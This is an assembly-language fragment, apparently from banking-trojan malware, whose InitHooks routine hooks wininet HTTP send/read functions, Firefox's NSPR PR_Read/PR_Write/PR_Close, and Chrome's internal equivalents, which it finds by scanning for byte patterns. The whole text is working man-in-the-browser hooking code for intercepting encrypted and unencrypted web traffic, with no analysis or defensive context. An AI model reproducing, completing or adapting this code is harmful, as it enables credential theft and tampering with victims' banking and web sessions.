
.code

;; ==================================================================================================== ;;
;; InitHooks -                                                                                          ;;
;; ==================================================================================================== ;;
InitHooks proc uses ecx

	invokx  _GetModuleHandleA[ebx], "wininet"
	jmpz eax, @F
	invokx  &ApiAddrFromCrc[ebx], eax

	invokx  &HookAPI[ebx], &hHttpQueryInfoA[ebx],      &_HttpQueryInfoA[ebx]

	invokx  &HookAPI[ebx], &hInternetCloseHandle[ebx], &_InternetCloseHandle[ebx]
	invokx  &HookAPI[ebx], &hHttpSendRequestA[ebx],    &_HttpSendRequestA[ebx]
	invokx  &HookAPI[ebx], &hHttpSendRequestW[ebx],    &_HttpSendRequestW[ebx]

	invokx  &HookAPI[ebx], &hInternetQueryDataAvailable[ebx], &_InternetQueryDataAvailable[ebx]
	invokx  &HookAPI[ebx], &hInternetReadFile[ebx],    &_InternetReadFile[ebx]

;	invokx  &HookAPI[ebx], &hInternetReadFileExA[ebx], &_InternetReadFileExA[ebx]
;	invokx  &HookAPI[ebx], &hHttpSendRequestExW[ebx],  &_HttpSendRequestExW[ebx]
;	invokx  &HookAPI[ebx], &hInternetWriteFile[ebx],   &_InternetWriteFile[ebx]
;	invokx  &HookAPI[ebx], &hHttpEndRequest[ebx],      &_HttpEndRequestA[ebx]


;; ================================================== ;;

@@:	invokx  _GetModuleHandleA[ebx], "nspr4"
	jmpz eax, @F
	invokx  &ApiAddrFromCrc[ebx], eax

	invokx  &HookAPI[ebx], &hPR_Write[ebx], &_PR_Write[ebx]
	invokx  &HookAPI[ebx], &hPR_Read[ebx],  &_PR_Read[ebx]
	invokx  &HookAPI[ebx], &hPR_Close[ebx], &_PR_Close[ebx]


;; ================================================== ;;

@@:	invokx  _GetModuleHandleA[ebx], "chrome"
	jmpz eax, @ret


	call @F
	;; 75 05 83 C8 FF 05 C3 56
	db 075h, 005h, 083h, 0C8h, 0FFh, 05Fh, 0C3h, 056h
@@:	pop  ecx
	invokx  &StrIPos[ebx], eax, 25000000, ecx, 8
	jmpz eax, @ret
	sub  eax, 14
	mov  _PR_Close[ebx], eax


	call @F
	db 08Bh, 04Ch, 024h, 004h
@@:	pop  ecx
	inc  eax
	invokx  &StrIPos[ebx], eax, 2048, ecx, 4
	mov  _PR_Read[ebx], eax


	call @F
	db 08Bh, 04Ch, 024h, 004h
@@:	pop  ecx
	inc  eax
	invokx  &StrIPos[ebx], eax, 2048, ecx, 4
	mov  _PR_Write[ebx], eax


	invokx  &HookAPI[ebx], &hPR_Write[ebx], &_PR_Write[ebx]
	invokx  &HookAPI[ebx], &hPR_Read[ebx],  &_PR_Read[ebx]
	invokx  &HookAPI[ebx], &hPR_Close[ebx], &_PR_Close[ebx]

@ret:
	ret
InitHooks endp

